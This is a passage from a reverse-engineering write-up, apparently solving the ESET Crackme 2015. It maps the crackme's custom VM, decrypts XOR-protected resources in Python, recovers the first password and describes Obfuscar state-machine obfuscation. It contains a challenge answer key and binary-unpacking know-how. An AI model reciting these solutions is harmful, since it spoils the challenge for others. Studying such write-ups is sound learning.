    vm.stack_base = stk
    vm.stack_top = stk+4*0xfffff
    memset(vm.regs, 0, 0x10*4)
    vm.regs[6] = vm.stack_top
    vm.regs[7] = vm[0x3fd]
    vm.regs[8] = vm[0x401]
    vm.regs[9] = vm.hModule
    for i in xrange(vm.nArgs):
        vm.regs[i+10] = vm.lpArgs[i]
    if (lpRes.sign != 0x1337)
        LoopVM()    // decrypt vm code
    vm.insn_base = &amp;amp;lpResource.code_offset
    Return LoopVM()
}

LoopVM()
{
    vm.insn_base = lpRes.insn_base
    while (vm.bRunning)
    {
        vm.func[_get_byte()]()
    }
    return vm.regs[0]
}
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;vm-layout&#34;&gt;VM Layout&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:right&#34;&gt;Offset&lt;/th&gt;
&lt;th&gt;Function Pointer&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0&lt;/td&gt;
&lt;td&gt;STOP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+4&lt;/td&gt;
&lt;td&gt;MOV&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+8&lt;/td&gt;
&lt;td&gt;CALL&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0xc&lt;/td&gt;
&lt;td&gt;CALL_STDLIB&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x10&lt;/td&gt;
&lt;td&gt;PUSH&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x14&lt;/td&gt;
&lt;td&gt;POP_REG&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x20&lt;/td&gt;
&lt;td&gt;CMP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x24&lt;/td&gt;
&lt;td&gt;JMP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x28&lt;/td&gt;
&lt;td&gt;CALL_VM&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x28&lt;/td&gt;
&lt;td&gt;RET_VM&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x30&lt;/td&gt;
&lt;td&gt;ALU&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x34&lt;/td&gt;
&lt;td&gt;MALLOC&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x38&lt;/td&gt;
&lt;td&gt;FREE&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x40&lt;/td&gt;
&lt;td&gt;EMULATE&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x44&lt;/td&gt;
&lt;td&gt;STOP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;&amp;hellip;&lt;/td&gt;
&lt;td&gt;&amp;hellip;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x3f8&lt;/td&gt;
&lt;td&gt;STOP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x3fc&lt;/td&gt;
&lt;td&gt;bRunning&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x3fd&lt;/td&gt;
&lt;td&gt;lpResource&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x401&lt;/td&gt;
&lt;td&gt;lpResource.size&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x405&lt;/td&gt;
&lt;td&gt;bModuleLoaded? ([lpResource+0xe])&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x409&lt;/td&gt;
&lt;td&gt;hModule (kernel32)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x40d&lt;/td&gt;
&lt;td&gt;nArgs&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x411&lt;/td&gt;
&lt;td&gt;lpArgs&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x415&lt;/td&gt;
&lt;td&gt;flags&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x416&lt;/td&gt;
&lt;td&gt;regs&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x42e&lt;/td&gt;
&lt;td&gt;stack_top&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x456&lt;/td&gt;
&lt;td&gt;insn_base&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x45a&lt;/td&gt;
&lt;td&gt;data_base&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x45e&lt;/td&gt;
&lt;td&gt;next_insn_offset&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x462&lt;/td&gt;
&lt;td&gt;stack_top&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x466&lt;/td&gt;
&lt;td&gt;stack_base&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;instruction-encoding&#34;&gt;Instruction Encoding&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; insn8
{
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;unsigned&lt;/span&gt; index: &lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;unsigned&lt;/span&gt; type: &lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;unsigned&lt;/span&gt; word_size:&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;;
};

&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; insn16
{
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;unsigned&lt;/span&gt; str_index: &lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;unsigned&lt;/span&gt; ldr_index: &lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;unsigned&lt;/span&gt; ldr_type: &lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;unsigned&lt;/span&gt; str_type: &lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;unsigned&lt;/span&gt; word_size: &lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;unsigned&lt;/span&gt; __pad:&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;;
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;file-layout-0x102&#34;&gt;File Layout (0x102)&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:right&#34;&gt;Offset&lt;/th&gt;
&lt;th&gt;Data&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0&lt;/td&gt;
&lt;td&gt;signature&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+2&lt;/td&gt;
&lt;td&gt;code_offset&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+6&lt;/td&gt;
&lt;td&gt;data_offset&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0xa&lt;/td&gt;
&lt;td&gt;size&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0xe&lt;/td&gt;
&lt;td&gt;bModuleLoaded?&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;If signature is not 0x1337, then code is encrypted, which must be decrypted using the signature as the xor key. Let’s look at the disassembly of resource 0x103.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;00    ldr X, R7             
        str X, R0             
03    ldr X, byte ptr [R0]  
        str X, R1             
06    ldr X, 0x1            
        add R0, X             
0a    ldr X, byte ptr [R0]  
        str X, R2             
0d    ldr X, 0x1            
        add R0, X             
11    ldr X, dword ptr [R0] 
        str X, R3             
14    ldr X, R8             
        str X, R0             
17    ldr X, R7             
        add R0, X             
1a    ldr X, R7             
        add R3, X             
1d    ldr X, byte ptr [R3]  
        str X, R4             
20    ldr X, R1             
        xor R4, X             
23    ldr X, R2             
        add R1, X             
26    ldr X, R4             
        str X, byte ptr [R3]  
29    ldr X, 0x1            
        add R3, X             
2d    ldr X, R0             
        cmp.ge X, R3          
30    ldr X, 0x1d           
        jmp.cc X              
36    ldr X, R7             
        str X, R0             
39    ldr X, 0x37           
        str X, byte ptr [R0]  
3d    ldr X, 0x1            
        add R0, X             
41    ldr X, 0x13           
        str X, byte ptr [R0]  
45    hlt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Yeah, it&amp;rsquo;s a xor encryption&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;key = b.sign[&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;]
incr = b.sign[&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;]

&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#24909d&#34;&gt;xrange&lt;/span&gt;(b.code_offset, b.code_offset+b.size):
    b[i] = (b[i]^key) + incr &amp;amp; &lt;span style=&#34;color:#3677a9&#34;&gt;0xff&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;resource-0x151&#34;&gt;Resource 0x151&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:004019FB                 mov     eax, 0DF09C20Dh
.text:00401A00                 mov     esi, [ebp+hWnd]
.text:00401A03                 mov     ecx, offset dword_412EF0
.text:00401A08                 mov     hWnd, esi
.text:00401A0E                 call    initialize
.text:00401A13                 lea     ecx, [ebp+uMsg]
.text:00401A16                 push    ecx             ; lpThreadId
.text:00401A17                 push    0               ; dwCreationFlags
.text:00401A19                 push    offset dword_412EF0 ; lpParameter
.text:00401A1E                 push    offset StartAddress ; lpStartAddress
.text:00401A23                 push    0               ; dwStackSize
.text:00401A25                 push    0               ; lpThreadAttributes
.text:00401A27                 call    ds:CreateThread
.text:00401A2D                 mov     hDlg, esi
.text:00401A33                 call    AcquireDebugPriv
.text:00401A38                 call    GetResource
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function &lt;strong&gt;GetResource&lt;/strong&gt; fetches resources 0xbb01 and 0xbb02. 0xbb01 is xor encrypted using &lt;strong&gt;&amp;ldquo;PIPE&amp;rdquo;&lt;/strong&gt;. Decoding gives three sha160 hashes.&lt;br&gt;
&lt;strong&gt;initialize&lt;/strong&gt; initializes &lt;strong&gt;dword_412EF0&lt;/strong&gt; with &lt;strong&gt;_resolve_sha1&lt;/strong&gt; and &lt;strong&gt;dword_412EF4&lt;/strong&gt; with &lt;code&gt;LoadLibraryA&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:0040228A                 mov     eax, [ebp+var_10]
.text:0040228D                 mov     eax, [eax]
.text:0040228F                 mov     ecx, [edi+8]
.text:00402292                 push    0
.text:00402294                 push    eax
.text:00402295                 push    0
.text:00402297                 push    ecx
.text:00402298                 call    ebx
.text:0040229A                 push    offset Edit_Handler
.text:0040229F                 push    GWLP_WNDPROC
.text:004022A1                 push    eax
.text:004022A2                 mov     _loadLib_sha1, edi
.text:004022A8                 call    esi             ; SetWindowLong
.text:004022AA                 mov     [edi+0Ch], eax
;
; ....
;
.text:004022ED                 push    offset lstrcmpA
.text:004022F2                 push    eax
.text:004022F3                 call    ecx
.text:004022F5                 mov     edx, [edi+4]
.text:004022F8                 push    eax
.text:004022F9                 call    edx
.text:004022FB                 jmp     short loc_4022FF
.text:004022FD ; ---------------------------------------------------------------------------
.text:004022FD
.text:004022FD loc_4022FD:                             ; CODE XREF: sub_402170+175↑j
.text:004022FD                                         ; sub_402170+17B↑j
.text:004022FD                 xor     eax, eax
.text:004022FF
.text:004022FF loc_4022FF:                             ; CODE XREF: sub_402170+18B↑j
.text:004022FF                 mov     [edi+114h], eax ; lstrcmpA
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here the message handler for the first text box is changed to &lt;strong&gt;Edit_Handler&lt;/strong&gt;. Let&amp;rsquo;s see what &lt;strong&gt;Edit_Handler&lt;/strong&gt; does&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:004023EC                 mov     ecx, eax
.text:004023EE                 call    base64_size
.text:004023F3                 mov     edi, eax
.text:004023F5                 push    edi             ; size_t
.text:004023F6                 call    operator new(uint)
.text:004023FB                 add     esp, 4
.text:004023FE                 push    ebx
.text:004023FF                 lea     ecx, [ebp+szInput]
.text:00402402                 mov     esi, eax
.text:00402404                 push    ecx
.text:00402405                 mov     ecx, [ebp+var_4C]
.text:00402408                 mov     [ebp+var_5C], esi
.text:0040240B                 call    toBase64
.text:00402410                 xor     eax, eax
.text:00402412                 mov     byte ptr [esi+edi-1], 0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Okay, so the input is first converted to base64&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:00402420 loc_402420:                             ; CODE XREF: Edit_Handler+BB↑j
.text:00402420                                         ; Edit_Handler+CB↓j
.text:00402420                 mov     dl, al
.text:00402422                 and     dl, 1
.text:00402425                 sub     [eax+esi], dl
.text:00402428                 inc     eax
.text:00402429                 cmp     eax, edi
.text:0040242B                 jl      short loc_402420
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Subtracts the parity of the offset of each byte from the bytes.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:0040242D                 mov     eax, _loadLib_sha1   ; 0x00412EF0
.text:00402432                 mov     edx, [eax+114h]
.text:00402438                 lea     ecx, [eax+118h]
.text:0040243E                 push    ecx
.text:0040243F                 push    esi
.text:00402440                 call    edx  ; lstrcmpA
.text:00402442                 test    eax, eax
.text:00402444                 jnz     short loc_40246E
.text:00402446                 mov     [ebp+var_4C], eax
.text:00402449                 push    5               ; unk
.text:0040244B                 lea     eax, [ebp+var_4C]
.text:0040244E                 push    eax             ; buffer
.text:0040244F                 push    0BB01h          ; tag
.text:00402454                 push    2               ; cmd
.text:00402456                 call    Send
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, the string is located at &lt;strong&gt;0x00412EF0+0x118&lt;/strong&gt; which is resource &lt;strong&gt;0xbb02&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.data:00413008 BB02            db 44h dup(?)           ; DATA XREF: GetResources+B6↑o
&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;bb02 = &lt;span style=&#34;color:#24909d&#34;&gt;bytearray&lt;/span&gt;(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;020f0674311f64230178163c340f282e50&amp;#34;&lt;/span&gt;.decode(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;hex&amp;#34;&lt;/span&gt;), &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#24909d&#34;&gt;xrange&lt;/span&gt;(&lt;span style=&#34;color:#24909d&#34;&gt;len&lt;/span&gt;(bb02)):
    bb02[i] ^= &lt;span style=&#34;color:#24909d&#34;&gt;ord&lt;/span&gt;(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;PIPE&amp;#39;&lt;/span&gt;[i &amp;amp; &lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;])
    bb02[i] += i&amp;amp;&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;

&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;print&lt;/span&gt; bb02.decode(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;base64&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;which outputs &lt;code&gt;Devin Castle&lt;/code&gt;. So, &lt;code&gt;Devin Castle&lt;/code&gt; is the &lt;strong&gt;first password&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;the-protocol&#34;&gt;The Protocol&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;                   +-----------------+    Fetch Resource         +-------------------------+
                   |                 +-------------------------&amp;gt; |        Thread2          |
                   |   GUI Thread    |                           |  (EsetCrackme2015.exe)  |
                   |                 |Length, Resource Data      |                         |
                   |                 |  &amp;lt;------------------------+                         |
                   |                 |   Notify Validation       |                         |
                   |                 +-------------------------&amp;gt; |                         |
                   +-----------------+                           +------------+------------+
                                                                              |
                                                                  Command-2   |   Mark Resource
                                                                              |   Set last resource to id
                                                                              v
                        +-------------------+                    +------------+------------+
                        |                   |                    |                         |
               TRUE     |  0xbb01, 0xbb02,  |                    |        Thread1          |
            +-----------+  0xbb03, 0xff01   |   call [edi+0x406] |    (Event Signaled)     |
            |           |      marked?      +&amp;lt;-------------------+                         |
            |           |                   |                    +-------------------------+
            |           +---------+---------+
            |                     |
            v               FALSE |         +-----------------+               +------------------+
    +-------+---------+           |         |                 |   TRUE        |                  |
    |                 |           +--------&amp;gt;+  Last Resource  +--------------&amp;gt;+ Extract drv.zip  |
    |    Congrats!    |                     |     0xbb01?     |               |                  |
    |                 |                     |                 |               +------------------+
    +-----------------+                     +--------+--------+
                                                     |
                                                     | FALSE
                                                     |
                                                     v
                                            +--------+--------+               +--------------------------+
                 +----------+     FALSE     |                 |               |                          |
                 |  RETURN  | &amp;lt;-------------+  Last Resource  |   TRUE        |  Extract -               |
                 +----------+               |     0xaa10?     +-------------&amp;gt; |                          |
                                            |                 |               |  1. PunchCardReader      |
                                            +-----------------+               |  2. PuncherMachine       |
                                                                              |  3. PunchCard.bmp        |
                                                                              |                          |
                                                                              +--------------------------+

&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;punchermachine&#34;&gt;PuncherMachine&lt;/h2&gt;
&lt;p&gt;Running DetectItEasy on PuncherMachine.exe it shows that its obfuscated by Obfuscar.
The symbols are renamed and the interesting fact is that the sequence of statements are put into a FSM, i.e. the implicit jump to from the current statement to the next statement is controlled by a FSM.&lt;/p&gt;
&lt;p&gt;For example, if the code contains&lt;/p&gt;
&lt;p&gt;stmt1;
stmt2;
stmt3;&lt;/p&gt;
&lt;p&gt;The obfuscated code will look like&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cs&#34; data-lang=&#34;cs&#34;&gt;state = &lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;
&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (;;)
{
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;switch&lt;/span&gt; (state ^ &lt;span style=&#34;color:#3677a9&#34;&gt;5&lt;/span&gt;)
    {
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;:
            &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// stmt2;
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;            state = &lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;;
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;continue&lt;/span&gt;;

        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#3677a9&#34;&gt;7&lt;/span&gt;:
            &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// stmt3;
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;            state = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;;
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;continue&lt;/span&gt;;

        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;:
            &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// stmt1;
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;            state = &lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;;
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;continue&lt;/span&gt;;

        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;default&lt;/span&gt;:
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;goto&lt;/span&gt; finish;
    }
}

finish:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Of course, the constants used for representing states won’t be this small.&lt;br&gt;
The code first computes the MD5 of all Instance, Public, Static, and NonPublic methods in the assembly. The MD5 generated is &lt;strong&gt;3C C0 21 F8 BC 62 3E C0 F5 45 0C 55 41 8B A1 20&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The resources &lt;strong&gt;0xFF01&lt;/strong&gt;, &lt;strong&gt;0xFF02&lt;/strong&gt; are fetched (command 1) and decrypted (AES Algorithm) using the above MD5 as the key. The decrypted contents of &lt;strong&gt;0xFF02&lt;/strong&gt; is &lt;strong&gt;&amp;ldquo;95eceaa118dd081119e26be1c44da2cb&amp;rdquo;&lt;/strong&gt;, a MD5 hash.&lt;/p&gt;
&lt;p&gt;The program prompts for selecting an image. Once the image is selected, it calculates its MD5 hash and matches with the decrypted MD5 hash (0xFF02). If the hashes mismatch, the program displays “Calibration Error”. Otherwise, it fetches the resources &lt;strong&gt;0xFF04&lt;/strong&gt; and &lt;strong&gt;0xFF00&lt;/strong&gt; and decrypts them using the same key.&lt;/p&gt;
&lt;p&gt;The resource &lt;strong&gt;0xFF04&lt;/strong&gt; is a &lt;strong&gt;.NET DLL&lt;/strong&gt; file. It contains two classes - &lt;code&gt;DynMethod.DynMethodFactory&lt;/code&gt; and &lt;code&gt;IlEmitHelp.ILEmitParticle&lt;/code&gt;. The resource 0xFF00 contains &lt;strong&gt;86 64-bit&lt;/strong&gt; integers.&lt;/p&gt;
&lt;p&gt;Now two textboxes appear with a button &amp;ldquo;Calibrate It&amp;rdquo;. Here is the Deobfuscated algorithm&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cs&#34; data-lang=&#34;cs&#34;&gt;List&amp;lt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;&amp;gt; lstChars = &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;new&lt;/span&gt; List&amp;lt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;&amp;gt;();
List&amp;lt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt;&amp;gt; lstInts = &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;new&lt;/span&gt; List&amp;lt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt;&amp;gt;();
Hashtable H;
&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;delegate&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;ulong&lt;/span&gt; HashIt(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt;);

Button.Click
{
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (validate(text1.Text, text2.Text))
    {
        &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// good jump
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;    }
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;else&lt;/span&gt;
    {
        MessageBox.Show(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Calibration Error!&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Error&amp;#34;&lt;/span&gt;);
    }
}


&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/*
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;    * lstChars and lstInts are initialized when the MD5 of the image is validated
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;    */&lt;/span&gt;
&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; Init()
{
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt; temp = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;0123456789ABCDEFGHIJKLMNOPQR/STUVWXYZabcdefghijklmnopqrstuvwxyz:#@\\\&amp;#34;.&amp;lt;(+|$*);,%_&amp;gt;? -&amp;amp;&amp;#34;&lt;/span&gt;;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; i &amp;lt; temp.Length; ++i)
        lstChars.Add(temp[i]);

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt;[] arr = &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt;[] {
